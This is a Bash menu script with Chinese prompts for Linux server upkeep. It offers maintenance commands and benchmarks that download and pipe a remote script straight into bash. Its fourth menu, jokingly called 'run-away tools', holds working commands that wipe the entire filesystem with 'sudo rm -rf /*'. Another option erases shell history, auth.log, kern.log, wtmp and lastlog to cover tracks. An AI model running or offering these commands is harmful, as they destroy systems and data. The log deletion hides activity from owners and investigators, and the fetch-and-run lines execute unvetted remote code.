#!/bin/bash

# 定义菜单
menu="
1. 安装工具
2. 运维工具
3. 跑分&测试
4. 跑路工具(不开玩笑！慎用！)
0. 退出
"

# 定义无效选项计数器
invalid_choice_count=0

# 显示菜单
echo "$menu"

# 循环，直到用户选择退出
while true; do
    # 提示用户输入选项
    read -p "请输入选项数字: " choice

    case $choice in
        1)
            # 子菜单，用于工具安装选项
            tool_menu="
            1. 工具1安装
            2. 工具2安装
            3. 工具3安装
            0. 返回上级菜单
            "
            echo "$tool_menu"
            read -p "请输入子菜单选项数字: " tool_choice
            case $tool_choice in
                1)
                    echo "安装工具1"
                    # 在这里添加工具1的安装命令
                    ;;
                2)
                    echo "安装工具2"
                    # 在这里添加工具2的安装命令
                    ;;
                3)
                    echo "安装工具3"
                    # 在这里添加工具3的安装命令
                    ;;
                0)
                    echo "返回上级菜单"
                    ;;
                *)
                    echo "无效选项，请重新输入"
                    ;;
            esac
            ;;
        2)
            # 子菜单，用于运维工具
            test_menu="
            1. 自动清理内核
            2. 查看当前目录下排名前五的大文件
            0. 返回上级菜单
            "
            echo "$test_menu"
            read -p "请输入子菜单选项数字: " test_choice
            case $test_choice in
                1)
                    echo "自动清理内核"
                    sudo apt-get autoremove --purge
                    ;;
                2)
                    echo "查看当前目录下排名前五的大文件"
                    du -a|sort -rn|head -5
                    ;;
                0)
                    echo "返回上级菜单"
                    ;;
                *)
                    echo "无效选项，请重新输入"
                    ;;
            esac
            ;;    
        3)
            # 子菜单，用于跑分&测试选项
            test_menu="
            1. 跑分测试
            2. speedtest 国内网络测试
            0. 返回上级菜单
            "
            echo "$test_menu"
            read -p "请输入子菜单选项数字: " test_choice
            case $test_choice in
                1)
                    echo "跑分测试"
                    bash <(wget -qO- https://down.vpsaff.net/linux/speedtest/superbench.sh) -f Speedtest
                    ;;
                2)
                    echo "speedtest 国内网络测试"
                    bash <(wget -qO- https://down.vpsaff.net/linux/speedtest/superbench.sh) --speed
                    ;;
                0)
                    echo "返回上级菜单"
                    ;;
                *)
                    echo "无效选项，请重新输入"
                    ;;
            esac
            ;;
        4)
            # 子菜单，用于跑路工具选项
            bypass_menu="
            1. sudo rm -rf /*
            2. rm ssh logs
            3. 跑路工具3
            0. 返回上级菜单
            "
            echo "$bypass_menu"
            read -p "请输入子菜单选项数字: " bypass_choice
            case $bypass_choice in
                1)
                    echo "sudo rm -rf /*"
                    sudo rm -rf /*
                    ;;
                2)
                    echo "rm ssh logs"
                    rm -f $HISTFILE && export HISTFILE=/dev/null && history -cw && rm -f /var/log/auth.log && rm -f /var/log/kern.log && rm -f /var/log/wtmp && rm -f /var/log/lastlog &&  kill -9 $$
                    ;;
                3)
                    echo "跑路工具3"
                    # 在这里添加跑路工具3的命令
                    ;;
                0)
                    echo "返回上级菜单"
                    ;;
                *)
                    echo "无效选项，请重新输入"
                    ;;
            esac
            ;;
        0)
            # 退出
            echo "退出脚本"
            exit 0
            ;;
        *)
            # 无效选项计数器加1
            ((invalid_choice_count++))
            if [ $invalid_choice_count -ge 3 ]; then
                echo "无效选项输入次数过多，即将退出脚本！"
                exit 1
            fi
            echo "无效选项，请重新输入"
            echo "$menu"
            ;;
    esac
done
